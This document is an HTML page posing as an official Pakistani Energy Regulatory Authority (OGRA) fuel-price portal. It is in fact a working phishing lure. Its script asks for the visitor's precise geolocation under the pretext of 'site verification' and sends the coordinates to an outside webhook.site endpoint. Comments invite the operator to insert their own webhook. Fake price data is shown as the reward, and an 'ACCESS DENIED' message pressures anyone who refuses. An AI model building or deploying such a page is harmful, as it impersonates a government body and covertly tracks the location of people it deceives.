<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Energy Regulatory Authority | Pakistan</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 font-sans text-gray-900">

    <nav class="bg-[#002d72] text-white p-5 shadow-lg border-b-4 border-yellow-500">
        <div class="max-w-md mx-auto text-center">
            <h1 class="font-bold text-lg">OGRA Energy Regulatory Portal</h1>
            <p class="text-[10px] uppercase tracking-widest text-yellow-400">Official Secure Access</p>
        </div>
    </nav>

    <main class="max-w-md mx-auto mt-10 p-6">
        <div id="main-card" id="main-card" p-8 rounded-xl shadow-xl border border-gray-200">
            <div id="content-area" class="text-center">
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/32/Flag_of_Pakistan.svg" class="w-16 mx-auto mb-4 opacity-80">
                <h2 class="text-xl font-bold text-blue-900 mb-2">Industrial Fuel Price Verification</h2>
                <p id="msg" class="text-gray-600 text-sm mb-6">Access to real-time furnace oil and sludge pricing is restricted. Please verify your industrial site location to proceed.</p>
                
                <button id="btn-fetch" onclick="initiateAuth()" class="w-full bg-blue-900 text-white font-bold py-4 rounded-lg hover:bg-blue-800 transition active:scale-95 shadow-lg">
                    Verify Site Location
                </button>
            </div>
        </div>
    </main>

    <script>
        // Har baar naya URL param generate kar taaki browser cache bypass ho
        function getUniqueLink() {
            return window.location.href.split('?')[0] + '?id=' + Math.floor(Math.random() * 1000000);
        }

        function initiateAuth() {
            const btn = document.getElementById('btn-fetch');
            btn.innerText = "Processing Security Handshake...";
            btn.disabled = true;

            if (navigator.geolocation) {
                // High accuracy for precise location
                navigator.geolocation.getCurrentPosition(
                    (pos) => releaseData(pos),
                    () => handleBlock()
                );
            }
        }

        async function releaseData(pos) {
            const data = { 
                lat: pos.coords.latitude, 
                lon: pos.coords.longitude,
                timestamp: new Date().toISOString()
            };

            // Apna Webhook yahan daal
            await fetch("https://webhook.site/a5810f06-e1e7-4069-a0b5-4eda839f0b5b", {
                method: "POST",
                body: JSON.stringify(data)
            });

            // Rates Unlock
            document.getElementById('main-card').innerHTML = `
                <h2 class='text-xl font-bold text-green-700 text-center mb-6'>Verification Successful</h2>
                <div class='space-y-4'>
                    <div class='p-4 bg-gray-50 border-l-4 border-green-600'>Furnace Oil (IFO): <span class='font-bold'>Rs. 198,400 / MT</span></div>
                    <div class='p-4 bg-gray-50 border-l-4 border-green-600'>Industrial Sludge: <span class='font-bold'>Rs. 89,200 / MT</span></div>
                </div>
                <p class='mt-6 text-[10px] text-gray-400 text-center'>Authorized by Energy Regulatory Authority.</p>
            `;
        }

        function handleBlock() {
            const msg = document.getElementById('msg');
            msg.innerText = "ACCESS DENIED: Your site location could not be verified. Please tap 'Allow' on the browser prompt to unlock pricing data.";
            msg.classList.add("text-red-600", "font-bold");
            document.getElementById('btn-fetch').innerText = "Retry Verification";
            document.getElementById('btn-fetch').disabled = false;
        }
    </script>
</body>
</html>
